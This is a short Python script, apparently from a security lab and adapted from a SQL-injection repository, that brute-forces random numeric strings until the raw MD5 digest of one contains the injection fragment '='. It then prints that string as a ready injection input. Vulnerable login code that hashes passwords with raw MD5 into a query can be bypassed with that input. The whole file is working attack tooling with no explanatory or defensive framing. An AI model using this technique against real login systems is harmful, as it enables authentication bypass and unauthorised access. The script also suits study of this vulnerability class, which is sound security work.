from pymd5 import md5
import random
import re
import binascii

print("Code takes around 20 seconds to run")
while(True):
    hold = ""
    hold += str(random.randint(0,2147483647))
    hold += str(random.randint(0,2147483647))
    hold += str(random.randint(0,2147483647))
    hold += str(random.randint(0,2147483647))

    hash = md5()
    hash.update(hold)

    found = re.search( r"'='",  hash.digest().decode(encoding='utf-8',errors='ignore'))

    if found:
        print ("inj ", hold)
        print("hash ",hash.hexdigest())
        break

# modified from https://github.com/seunghunoh57/SQL-Injection/blob/master/sql_1-2.py